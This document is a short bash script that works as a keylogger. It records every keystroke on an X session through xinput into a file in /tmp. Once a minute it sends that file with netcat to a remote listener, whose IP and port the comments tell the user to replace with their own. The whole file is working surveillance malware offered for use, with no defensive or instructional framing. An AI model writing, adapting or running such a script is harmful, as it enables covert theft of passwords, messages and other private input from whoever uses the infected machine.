#!/bin/bash

# Path to save keystrokes locally
LOGFILE="/tmp/keylog.txt"

# Remote server details
REMOTE_IP="10.1.13.178"  # Replace with your remote server IP
REMOTE_PORT=4444         # The listening port on your remote server

# Main logging loop
while true; do
    # Capture keystrokes (example using xinput or evtest if available)
    xinput test-xi2 --root > "$LOGFILE" &
    
    # Send the file contents to the remote server every minute
    sleep 60
    nc $REMOTE_IP $REMOTE_PORT < "$LOGFILE"
done
